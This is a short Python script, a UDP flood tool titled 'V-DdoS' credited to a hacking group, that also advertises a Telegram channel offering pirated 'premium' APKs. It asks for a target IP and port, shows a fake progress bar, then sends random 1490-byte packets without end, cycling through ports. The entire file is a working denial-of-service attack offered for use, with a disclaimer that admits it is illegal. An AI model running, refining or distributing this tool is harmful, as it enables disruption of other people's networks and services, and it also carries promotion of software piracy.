print ("\033[91m")
from mimetypes import init
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("cls")
os.system("title V-DdoS")
print
print ("Coded By : Mr.BL4Z3")
print ("Author   : T34m V18rs")
print ("Github   : github.com/T34mV18rs")
print ("Fb Page  : facebook.com/TeamVirusOfficial")
print ("FB Group : facebook.com/groups/mohinhossen")
print ("Telegram : t.me/Crackerspace")
print ("Join Cracker Space TG Group To Get Premium Apk(s) Free")
print ("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems")
print
ip = input("IP Target : ")
port_input = input("Port       : ")  # Take the input as a string
try:
    port = int(port_input)  # Convert the input to an integer
except ValueError:
    print("Invalid input for port. Please enter a valid integer.")
    sys.exit(1)
os.system("cls")
print("\033[93m")
os.system("title DdoS Attack")
print("Team : T34m V18rs")
print ("\033[92m")
print ("[                    ] 0% ")
time.sleep(5)
print ("[=====               ] 25%")
time.sleep(5)
print ("[==========          ] 50%")
time.sleep(5)
print ("[===============     ] 75%")
time.sleep(5)
print ("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s through port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1

init()
